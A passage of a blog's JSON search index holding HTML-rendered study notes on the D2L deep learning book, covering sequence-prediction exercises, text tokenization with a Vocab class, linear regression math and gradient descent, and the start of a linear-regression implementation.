class=\"number\">1000</span>],</span><br><span class=\"line\">         figsize=(<span class=\"number\">6</span>, <span class=\"number\">3</span>))</span><br></pre></td></tr></table></figure>\n<p>For different steps, 1,4,16,64,mean that :give 4 points, then predict the futrue 1 or 4 or 16 or 64 ponits respectively.</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-27%20at%2010.08.17%20PM.png\" alt=\"Screen Shot 2023-03-27 at 10.08.17 PM\"></p>\n<h2><span id=\"235-summary\">23.5 Summary</span></h2><p>1) The difficulty for predict a time sequence is that it’s hard to predict the far futrue, each simple error will accumulate to a big fail.<br>2) We can use specific stastical tools to analyze the time sequence prediction, such as Markov model.</p>\n<h2><span id=\"235-exercise\">23.5 Exercise</span></h2><p>1) Improve the model in the experiment of this section.</p>\n<pre><code>1.  Incorporate more than the past 4 observations? How many do you really need?\n2.  How many past observations would you need if there was no noise? Hint: you can write sinand cos as a differential equation.\n3.  Can you incorporate older observations while keeping the total number of features constant? Does this improve accuracy? Why?\n4.  Change the neural network architecture and evaluate the performance. You may train the new model with more epochs. What do you observe?\n</code></pre><p>2) An investor wants to find a good security to buy. He looks at past returns to decide which one is likely to do well. What could possibly go wrong with this strategy?</p>\n<p>3)  Does causality also apply to text? To which extent?</p>\n<p>4) Give an example for when a latent autoregressive model might be needed to capture the dynamic of the data.</p>\n","categories":["ML"],"tags":["d2l"]},{"title":"24_Text_Preprocessing","url":"/2023/03/27/D2L_024_Text_Preprocessing/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script>\n\n<h2><span id=\"241-overview\">24.1 Overview</span></h2><p>Common steps to process the text dataset:<br>1) Load the text as the string into the memory.<br>2) Divide the Raw Text to the  tokens.<br>3) Build a vocabulary dictionary to associate each vocabulary element with a numerical index.<br>4) Convert the text into sequences of numerical indices.</p>\n<h2><span id=\"242-reading-the-dataset\">24.2 Reading the Dataset</span></h2><p>We use a novel as out dataset which  containing about over 30000 words.<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#@save</span></span><br><span class=\"line\">d2l.DATA_HUB[<span class=\"string\">&#x27;time_machine&#x27;</span>] = (d2l.DATA_URL + <span class=\"string\">&#x27;timemachine.txt&#x27;</span>,</span><br><span class=\"line\">                                <span class=\"string\">&#x27;090b5e7e70c295757f55df93cb0a180b9691891a&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">read_time_machine</span>():</span>  <span class=\"comment\">#@save</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;将时间机器数据集加载到文本行的列表中&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(d2l.download(<span class=\"string\">&#x27;time_machine&#x27;</span>), <span class=\"string\">&#x27;r&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">        lines = f.readlines()</span><br><span class=\"line\">        <span class=\"comment\">#remove all the symbols except letters,containing the punctuation.</span></span><br><span class=\"line\">        <span class=\"comment\"># Then transform all the Upper letters to lower letters.</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> [re.sub(<span class=\"string\">&#x27;[^A-Za-z]+&#x27;</span>, <span class=\"string\">&#x27; &#x27;</span>, line).strip().lower() <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> lines]</span><br><span class=\"line\"></span><br><span class=\"line\">lines = read_time_machine()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;# 文本总行数: <span class=\"subst\">&#123;<span class=\"built_in\">len</span>(lines)&#125;</span>&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(lines[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(lines[<span class=\"number\">10</span>])</span><br></pre></td></tr></table></figure></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-28%20at%202.03.26%20PM.png\" alt=\"Screen Shot 2023-03-28 at 2.03.26 PM\"></p>\n<h2><span id=\"243-tokenization\">24.3 Tokenization</span></h2><p>Splir the sentence into individual words or characteristics.</p>\n<p>char:</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-28%20at%202.16.30%20PM.png\" alt=\"Screen Shot 2023-03-28 at 2.16.30 PM\"></p>\n<p>word:</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-28%20at%202.16.45%20PM.png\" alt=\"Screen Shot 2023-03-28 at 2.16.45 PM\"></p>\n<h2><span id=\"244-vocabulary\">24.4 Vocabulary</span></h2><p>Map the token with a numeral array, with vaule begin from 0, as the index of a text token.<br>But some cases must be considered<br>1) The tokens cantain a large numbers of repeated words,we can’t recount for each words, regardless of whether it is the only words.<br>2) We need to regular some rules for the unkonw words, begin and end words, or the padding words.<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Vocab</span>:</span>  <span class=\"comment\">#@save</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;文本词表&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self, tokens=<span class=\"literal\">None</span>, min_freq=<span class=\"number\">0</span>, reserved_tokens=<span class=\"literal\">None</span></span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> tokens <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">            tokens = []</span><br><span class=\"line\">        <span class=\"keyword\">if</span> reserved_tokens <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">            reserved_tokens = []</span><br><span class=\"line\">        <span class=\"comment\"># 按出现频率排序</span></span><br><span class=\"line\">        counter = count_corpus(tokens)</span><br><span class=\"line\">        self._token_freqs = <span class=\"built_in\">sorted</span>(counter.items(), key=<span class=\"keyword\">lambda</span> x: x[<span class=\"number\">1</span>],</span><br><span class=\"line\">                                   reverse=<span class=\"literal\">True</span>)</span><br><span class=\"line\">        <span class=\"comment\"># 未知词元的索引为0</span></span><br><span class=\"line\">        self.idx_to_token = [<span class=\"string\">&#x27;&lt;unk&gt;&#x27;</span>] + reserved_tokens</span><br><span class=\"line\">        <span class=\"comment\">#</span></span><br><span class=\"line\">        self.token_to_idx = &#123;token: idx</span><br><span class=\"line\">                             <span class=\"keyword\">for</span> idx, token <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(self.idx_to_token)&#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> token, freq <span class=\"keyword\">in</span> self._token_freqs:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> freq &lt; min_freq:</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> token <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> self.token_to_idx:</span><br><span class=\"line\">                self.idx_to_token.append(token)</span><br><span class=\"line\">                self.token_to_idx[token] = <span class=\"built_in\">len</span>(self.idx_to_token) - <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__len__</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">len</span>(self.idx_to_token)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__getitem__</span>(<span class=\"params\">self, tokens</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> <span class=\"built_in\">isinstance</span>(tokens, (<span class=\"built_in\">list</span>, <span class=\"built_in\">tuple</span>)):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> self.token_to_idx.get(tokens, self.unk)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> [self.__getitem__(token) <span class=\"keyword\">for</span> token <span class=\"keyword\">in</span> tokens]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">to_tokens</span>(<span class=\"params\">self, indices</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> <span class=\"built_in\">isinstance</span>(indices, (<span class=\"built_in\">list</span>, <span class=\"built_in\">tuple</span>)):</span><br><span class=\"line\">            <span class=\"keyword\">return</span> self.idx_to_token[indices]</span><br><span class=\"line\">        <span class=\"keyword\">return</span> [self.idx_to_token[index] <span class=\"keyword\">for</span> index <span class=\"keyword\">in</span> indices]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">    @property</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">unk</span>(<span class=\"params\">self</span>):</span>  <span class=\"comment\"># 未知词元的索引为0</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">    @property</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">token_freqs</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> self._token_freqs</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">count_corpus</span>(<span class=\"params\">tokens</span>):</span>  <span class=\"comment\">#@save</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;统计词元的频率&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"comment\"># 这里的tokens是1D列表或2D列表</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(tokens) == <span class=\"number\">0</span> <span class=\"keyword\">or</span> <span class=\"built_in\">isinstance</span>(tokens[<span class=\"number\">0</span>], <span class=\"built_in\">list</span>):</span><br><span class=\"line\">        <span class=\"comment\"># 将词元列表展平成一个列表</span></span><br><span class=\"line\">        tokens = [token <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> tokens <span class=\"keyword\">for</span> token <span class=\"keyword\">in</span> line]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> collections.Counter(tokens)</span><br><span class=\"line\">    <span class=\"comment\"># iterate the all list of token, then </span></span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">vocab = Vocab(tokens)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">list</span>(vocab.token_to_idx.items())[:<span class=\"number\">10</span>])</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> [<span class=\"number\">0</span>, <span class=\"number\">10</span>]:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;文本:&#x27;</span>, tokens[i])</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;索引:&#x27;</span>, vocab[tokens[i]])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">load_corpus_time_machine</span>(<span class=\"params\">max_tokens=-<span class=\"number\">1</span></span>):</span>  <span class=\"comment\">#@save</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;返回时光机器数据集的词元索引列表和词表&quot;&quot;&quot;</span></span><br><span class=\"line\">    lines = read_time_machine()</span><br><span class=\"line\">    tokens = tokenize(lines, <span class=\"string\">&#x27;char&#x27;</span>)</span><br><span class=\"line\">    vocab = Vocab(tokens)</span><br><span class=\"line\">    <span class=\"comment\"># 因为时光机器数据集中的每个文本行不一定是一个句子或一个段落，</span></span><br><span class=\"line\">    <span class=\"comment\"># 所以将所有文本行展平到一个列表中</span></span><br><span class=\"line\">    corpus = [vocab[token] <span class=\"keyword\">for</span> line <span class=\"keyword\">in</span> tokens <span class=\"keyword\">for</span> token <span class=\"keyword\">in</span> line]</span><br><span class=\"line\">    <span class=\"keyword\">if</span> max_tokens &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">        corpus = corpus[:max_tokens]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> corpus, vocab</span><br><span class=\"line\"></span><br><span class=\"line\">corpus, vocab = load_corpus_time_machine()</span><br><span class=\"line\"><span class=\"built_in\">len</span>(corpus), <span class=\"built_in\">len</span>(vocab)</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-28%20at%206.40.32%20PM.png\" alt=\"Screen Shot 2023-03-28 at 6.40.32 PM\"></p>\n","categories":["ML"],"tags":["d2l"]},{"title":"07_Linear_Regression","url":"/2023/03/14/D2l_007_Linear_Regression/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p><script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script><br>\n    <div id=\"aplayer-qqDnzyVb\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div></p>\n<h2><span id=\"71-basics\">7.1 Basics</span></h2><p><strong>Linear regression</strong> may be both the simplest and most popular among the standard tools for tackling regression problems</p>\n<h3><span id=\"711-a-simplified-model-with-mathmatical-presentation\">7.1.1 A simplified model with mathmatical presentation</span></h3><p>Asume we have only three input featrues : number of bedroom , number of wash room and living area ,represented as x1,x2,and x3 respectively.<br>And then consider the final price is a weighted sum of the key featrues , represented as :</p>\n<script type=\"math/tex; mode=display\">\ny  = x_{1}{\\mathbf{w_{1}}}+  x_{2}{\\mathbf{w_{2}}}+ x_{3}{\\mathbf{w_{3}}} + b</script><p> b indicates the <strong>bias</strong>.<br> And we can expand the simple model with a N order sequenial input as a linear form.</p>\n<h3><span id=\"712-linear-form-of-a-general-model\">7.1.2 Linear form of a general model</span></h3><p>Given a n-dimension input :</p>\n<script type=\"math/tex; mode=display\">\n\\mathbf{x} = [x_{1},x_{2},x_{3}\\dots X_{n}]^T</script><p>with a n-dimension weights and a scalar b :</p>\n<script type=\"math/tex; mode=display\">\n\\mathbf{w} = [w_{1},w_{2},w_{3}\\dots w_{n}]^T</script><p>we obtain a scalar weighted sum y :</p>\n<script type=\"math/tex; mode=display\">\ny = x_{1}w_{1}+x_{2}w_{2}+\\dots+x_{n}w_{1n}+b</script><p>Vector form :</p>\n<script type=\"math/tex; mode=display\">\ny = <\\mathbf{w},\\mathbf{x}>+b</script><p>equals to :</p>\n<script type=\"math/tex; mode=display\">\ny = \\mathbf{w}^T\\mathbf{x}+b</script><p>we can consider the linear model as a sigle layer nerual network.<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-16%20at%2010.47.42%20AM.png\" alt=\"Screen Shot 2023-03-16 at 10.47.42 AM\"></p>\n<h2><span id=\"72-loss-function\">7.2 Loss Function</span></h2><p>Before we can go about searching for the best parameters ,we will need two more things<br>1) A quality measure for given model<br>2) A procedure for updating the model to improve its quality.</p>\n<p>We introduce <strong>Loss functions</strong> to quantify the distance between the <strong>real</strong> and <strong>predicted</strong> values of the target. And for a linear regression problem , the most common loss function is squared error.</p>\n<h3><span id=\"721-expression\">7.2.1 Expression</span></h3><p>Squared error is given by</p>\n<script type=\"math/tex; mode=display\">\nL(\\mathbf{w},b) = \\frac{1}{2}(y-\\overset{\\frown}{y})^2</script><p>subsititute the input to the average  Squared error  function we gain the following expression:</p>\n<script type=\"math/tex; mode=display\">\nl(\\mathbf{X},\\mathbf{Y},\\mathbf{w},b) = \\frac{1}{2n}\\sum _{i=1}^n(y_{i}-,<\\mathbf{x_{i}},\\mathbf{w}>-b)^2</script><script type=\"math/tex; mode=display\">\n= \\frac{1}{2n} \\|\\mathbf{y}-\\mathbf{X}\\mathbf{w}-b\\|^2</script><p>(Use “|| ||”  to present a functional)</p>\n<p>And then minimize the loss function to learn the appropriate parameters.</p>\n<script type=\"math/tex; mode=display\">\n\\mathbf{w}^*,\\mathbf{b}^* = arg min_{\\mathbf{w},b}l(\\mathbf{X},\\mathbf{Y},\\mathbf{w},b)</script><h3><span id=\"722-gradient\">7.2.2 Gradient</span></h3><p>Caculate the partial drivation to w, use the caculaiton we learned before at Module:[[D2L_006_Chain_Rule&amp;automatic_derivation]]</p>\n<script type=\"math/tex; mode=display\">\n\\frac{\\partial l(\\mathbf{X},\\mathbf{y},\\mathbf{w})}{\\partial\\mathbf{w}} = \\frac {1}{n}(\\mathbf{y}-\\mathbf{X}\\mathbf{w})^T \\mathbf{X}</script><p>We want the reuslt infinitely closes to 0, so :</p>\n<script type=\"math/tex; mode=display\">\n\\frac {1}{n}(\\mathbf{y}-\\mathbf{X}\\mathbf{w})^T \\mathbf{X} = 0</script><p>Apply some simple transpose matrix ‘s characteristics, we can gain that:</p>\n<script type=\"math/tex; mode=display\">\n\\mathbf{y}\\mathbf{X}^T = \\mathbf{X^T}\\mathbf{X}\\mathbf{w}</script><script type=\"math/tex; mode=display\">\n\\mathbf{w}^* = (\\mathbf{X}^T\\mathbf{X})^{-1}\\mathbf{X}^T\\mathbf{y}</script><h2><span id=\"73-gradient-descent\">7.3 Gradient Descent</span></h2><h3><span id=\"731-basic-idea\">7.3.1 basic idea</span></h3><p>The most naive application of gradient descent consists of taking the derivative of the loss function.<br>Given a quit complex loss function with a height value to present the function value, how can we minimize it ?</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-16%20at%2011.26.21%20PM.png\" alt=\"Screen Shot 2023-03-16 at 11.26.21 PM\"></p>\n<p>So since the 3D graph is just like mountains ,we can present it as a form of contour line, extract a small piece from the hole function, we can gain the following graph:</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-16%20at%2010.28.58%20PM.png\" alt=\"Screen Shot 2023-03-16 at 10.28.58 PM\"></p>\n<p>From the above figure we can observate two vectors , </p>\n<script type=\"math/tex; mode=display\">\n1 : \\mathbf{w_{1}}-\\mathbf{w_{0}}</script><script type=\"math/tex; mode=display\">\n2 : \\mathbf{w_{2}}-\\mathbf{w_{1}}</script><p>And each vector’s direction is point out the <strong>fastest descent’s direction</strong>, and vector will be updated constantly, which “draw” a shortest path of descent. And It’s use the “Gradient” to achive the  fastest because of the <strong>partial drivation</strong> is exactly indicates the fastest vary speed at a given point(time).<br>So how to calculate out the “best”  parameter?</p>\n<h3><span id=\"732-optimize-algorithm\">7.3.2 Optimize Algorithm</span></h3><h4><span id=\"7321-intuitive-description\">7.3.2.1 Intuitive Description</span></h4><p>So firstly we can start with a relatively intuitive way to understand  procedures of the optimize algorithm.<br>Back to the graph:<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-16%20at%2011.26.21%20PM.png\" alt=\"Screen Shot 2023-03-16 at 11.26.21 PM\"></p>\n<p>The primary task is to find a minimun value of fuunction J.<br>But in a relatively initial condition, it’s hard to find the minimun value driectily because there is definetely some unkown parameter which are prepared to be caculated.<br>So what we can do is ,for each weight parameter, find out it’s rapidly descent dirction,then repeats this step over and over again , untill all of the weight parameters have been worked out.<br>The step Somehow like the graph :</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-16%20at%2011.45.59%20PM.png\" alt=\"Screen Shot 2023-03-16 at 11.45.59 PM\"></p>\n<p>When it arrive the local minimum value, we call reach a local convergence.</p>\n<h4><span id=\"7322-mathmatical-method\">7.3.2.2 Mathmatical Method</span></h4><p>First we look at the formula:</p>\n<script type=\"math/tex; mode=display\">\n\\mathbf{w_{t}} = \\mathbf{w_{t-1}}-\\eta\\frac{\\partial \\ell }{\\mathbf{w_{t-1}}}</script><p>Let’s start with a simple case:<br>Assume</p>\n<script type=\"math/tex; mode=display\">\n\\mathbf{w_{1}} = \\mathbf{w_{0}} - \\eta\\frac{\\partial \\ell }{\\mathbf{w_{0}}}</script><p>So in above expression:</p>\n<script type=\"math/tex; mode=display\">\n -\\frac{\\partial \\ell }{\\mathbf{w_{0}}}</script><p>determines the direction of the vector.</p>\n<script type=\"math/tex; mode=display\">\n \\eta</script><p>is a learning rate to determine the Modulus length(step length ) of the vector.<br>  We can just rewrite the equation to clearify the idea.</p>\n<script type=\"math/tex; mode=display\">\n\\mathbf{w_{1}}-\\mathbf{w_{0}}  = -\\eta\\frac{\\partial \\ell }{\\mathbf{w_{0}}}</script><script type=\"math/tex; mode=display\">\n\\mathbf{w_{2}}-\\mathbf{w_{1}}  = -\\eta\\frac{\\partial \\ell }{\\mathbf{w_{1}}}</script><script type=\"math/tex; mode=display\">\n\\cdots</script><script type=\"math/tex; mode=display\">\n\\mathbf{w_{t}}-\\mathbf{w_{t-1}}  = -\\eta\\frac{\\partial \\ell }{\\mathbf{w_{t-1}}}</script><p>And all of the vectors comstitute of the path we “downhill”.</p>\n<h5><span id=\"discussion-learning-rate\">Discussion: Learning Rate</span></h5><p>So you must mentioned that in the above algorithm, the learning rate is fixed , and the different value maybe lead the totally different result.</p>\n<h6><span id=\"too-big-step\">Too big step</span></h6><p>Too big step will cause the model hard to converge(ocsillation).<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-17%20at%2012.12.08%20AM.png\" alt=\"Screen Shot 2023-03-17 at 12.12.08 AM\"></p>\n<h6><span id=\"too-small-step\">Too small step</span></h6><p>Model will pass overmuch paths to converge.(Expenses will be high)<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-17%20at%2012.11.49%20AM.png\" alt=\"Screen Shot 2023-03-17 at 12.11.49 AM\"></p>\n<h4><span id=\"7323-mini-batch-gradient-decsent\">7.3.2.3 Mini-Batch Gradient Decsent</span></h4><p>When we train our model , maybe it’s unrealistic to use the whole dataset simutaneously, so sampleing some data randomly to approximate the loss is a good choice.<br>And the minibathc Gradient Decsent can be expressed as the following expression:</p>\n<script type=\"math/tex; mode=display\">\n\\frac{1}{b} \\sum_{i \\in I_{b}}\\ \\ell(\\mathbf{x}_{i},y_{i},\\mathbf{w})</script><p>The ecpression meant to caculate the average of the sample loss’sum .<br>b is the size of the batch , another important <strong>hyperparameters</strong>.</p>\n<h5><span id=\"discussion-size-of-batch\">Discussion: Size of Batch</span></h5><h6><span id=\"too-small\">Too small</span></h6><p>Leads to a too small calculations to waste some resources.</p>\n<h6><span id=\"too-big\">Too big</span></h6><p>A waste of memory or caculation(e.g : All of the samples are same)</p>\n<h2><span id=\"74-extra\">7.4 Extra</span></h2><h3><span id=\"740-vectorization-for-speed\">7.4.0  Vectorization for Speed</span></h3><p>So at the previous courses we get kown how to caculate matrix through pytorch, and now let us substaintiate it by some pratical evidence.<br>We can comparate the speed of  Vectorization and the ordinary method in a “loop “ perspective.<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-17%20at%209.18.12%20AM.png\" alt=\"Screen Shot 2023-03-17 at 9.18.12 AM\"></p>\n<h3><span id=\"741-the-normal-distribution-and-squared-loss\">7.4.1 The Normal Distribution and Squared Loss</span></h3><h4><span id=\"normal-distribution\">Normal Distribution:</span></h4><script type=\"math/tex; mode=display\">\np(x) = \\frac{1}{\\sqrt{2\\pi \\sigma^2} } \\exp(-\\frac{1}{2 \\sigma^2}(x-\\mu^2 ) )</script><p>Python:<br>(just convey it as python language, then plot it out)<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-17%20at%209.36.00%20AM.png\" alt=\"Screen Shot 2023-03-17 at 9.36.00 AM\"></p>\n<h2><span id=\"75-exercises\">7.5 Exercises</span></h2><h4><span id=\"1\">1)</span></h4><p>Assume that we have some data x1,…,xn∈R. Our goal is to find a constant b such that ∑i(xi−b)2 is minimized.</p>\n<ol>\n<li>Find an analytic solution for the optimal value of b.<br>Using gradient decsent method to fit the best “b” with input datas.</li>\n<li>How does this problem and its solution relate to the normal distribution?<br>Assume that observations arise from noisy measurements, where the noise is normally distributed.</li>\n<li>What if we change the loss from ∑i(xi−b)2 to ∑i|xi−b|? Can you find the optimal solution for b?<br>Divide the situations into two case; xi &gt; b or xi &lt; b ,then deplete the absolute value symbol to caculate the gradient.(?) <h4><span id=\"2\">2)</span></h4>Prove that the affine functions that can be expressed by x⊤w+b are equivalent to linear functions on (x,1).<br><strong>For a linear function , b = 0.</strong><br>So if the  linear function pass through point set(x,1) , it will be expanded to affine function.<h4><span id=\"3\">3)</span></h4>Assume that you want to find quadratic functions of x, i.e., f(x)=b+∑iwixi+∑j≤iwijxixj. How would you formulate this in a deep network?<br>Simlipy this question into a intuitive expression: <strong>How to construct a deep network for a general quadratic function</strong>.<br>And we can also summarize the question into : <strong>How to conduct the partial derivation (or just gradient ) for a  quadratic matrix function</strong>.<br>And the caculation as follows:<script type=\"math/tex; mode=display\">\n\\frac{\\partial x^TAx}{\\partial x} = (A + A^T) x</script></li>\n</ol>\n<p>​</p>\n","categories":["ML"],"tags":["d2l"]},{"title":"08_LR_Realization","url":"/2023/03/17/D2l_008_Linear_Regression_Implement/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p><script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script><br>\n    <div id=\"aplayer-FYUuVNfP\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div></p>\n<h2><span id=\"81-generate-dataset\">8.1 Generate Dataset</span></h2><p>Use the normal distribution to generate some random numbers ,input them as vector x , with the indicated weight and b.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">%matplotlib inline</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"><span class=\"keyword\">from</span> mxnet <span class=\"keyword\">import</span> autograd, np, npx</span><br><span class=\"line\"><span class=\"keyword\">from</span> d2l <span class=\"keyword\">import</span> mxnet <span class=\"keyword\">as</span> d2l</span><br><span class=\"line\">npx.set_np()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">synthetic_data</span>(<span class=\"params\">w, b, num_examples</span>):</span>  <span class=\"comment\">#@save</span></span><br><span class=\"line\">    X = np.random.normal(<span class=\"number\">0</span>, <span class=\"number\">1</span>, (num_examples, <span class=\"built_in\">len</span>(w)))</span><br><span class=\"line\">    <span class=\"comment\"># Generate w length random x vector.</span></span><br><span class=\"line\">    y = np.dot(X, w) + b</span><br><span class=\"line\">    <span class=\"comment\"># Input x into system.</span></span><br><span class=\"line\">    y += np.random.normal(<span class=\"number\">0</span>, <span class=\"number\">0.01</span>, y.shape)</span><br><span class=\"line\">    <span class=\"comment\"># Complicate y with some random oscillation.</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> X, y.reshape((-<span class=\"number\">1</span>, <span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">true_w = np.array([<span class=\"number\">2</span>, -<span class=\"number\">3.4</span>])</span><br><span class=\"line\">true_b = <span class=\"number\">4.2</span></span><br><span class=\"line\">features, labels = synthetic_data(true_w, true_b, <span class=\"number\">1000</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># features: [1.1630787 2.2122064] </span></span><br><span class=\"line\"><span class=\"comment\"># label: [-1.0015326]</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-17%20at%204.41.59%20PM.png\" alt=\"Screen Shot 2023-03-17 at 4.41.59 PM\"></p>\n<p>From the figure we can estimate that the featrue and label are linear relative.</p>\n<h2><span id=\"82-read-dataset\">8.2 Read Dataset</span></h2><p>From the “big” dataset, we randomly read a minibatch of datas every times.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">data_iter</span>(<span class=\"params\">batch_size, features, labels</span>):</span></span><br><span class=\"line\">    num_examples = <span class=\"built_in\">len</span>(features)</span><br><span class=\"line\">    <span class=\"comment\"># read the total 